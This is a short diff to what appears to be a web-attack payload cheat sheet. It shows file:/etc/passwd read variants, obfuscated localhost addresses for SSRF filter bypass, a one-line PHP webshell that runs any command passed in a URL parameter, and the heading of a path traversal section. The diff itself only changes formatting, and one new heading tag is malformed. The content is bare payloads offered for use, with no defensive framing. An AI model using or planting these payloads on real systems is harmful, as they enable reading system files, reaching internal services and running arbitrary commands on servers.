@@ -3,7 +3,6 @@
 
 <h3>file:</h3>
 ## /etc/passwd
-
 <pre><code>
 file:/etc/passwd?/
 file:/etc/passwd%3F/
@@ -45,10 +44,12 @@ http://%31%32%37%2E%30%2E%30%2E%31
 http://127.000.000.001
 </code></pre>
 
-<h1 align="center">PHP webshell</h1>
+<<h3>>PHP webshell</h3>
 
 <pre><code>
+  
 <?php system($_GET['cmd']);?>
+
 </code></pre>
 
 <h1 align="center">Path traversal Payloads</h1>
